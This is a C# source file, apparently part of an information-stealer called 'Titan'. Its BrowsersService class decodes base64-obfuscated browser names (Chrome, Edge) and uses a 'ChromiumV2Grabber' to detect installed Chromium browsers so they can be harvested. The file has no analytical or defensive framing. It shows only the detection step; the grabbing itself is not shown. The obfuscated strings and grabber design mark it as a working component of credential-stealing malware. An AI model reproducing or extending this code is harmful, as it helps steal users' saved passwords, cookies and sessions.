using System.Collections.Generic;
using System.Linq;
using Titan.NF.Client.Browsers.Contracts;
using Titan.NF.Client.Browsers.Grabbers;

namespace Titan.NF.Client.Browsers
{
    internal class BrowsersService
    {
        private static List<string> Browsers = new List<string>()
        {
            "R29vZ2xlIENocm9tZQ==",
            "TWljcm9zb2Z0IEVkZ2U="
        };

        public static List<IBrowserGrabber> DetectedBrowsers()
        {
            List<IBrowserGrabber> detectedBrowsers = new List<IBrowserGrabber>();

            foreach (var browser in Browsers)
            {
                var grabber = new ChromiumV2Grabber();
                grabber.For(browser.FromBase64());

                if(grabber.Detected())
                {
                    detectedBrowsers.Add(grabber);
                }
            }

            return detectedBrowsers;
        }
    }
}
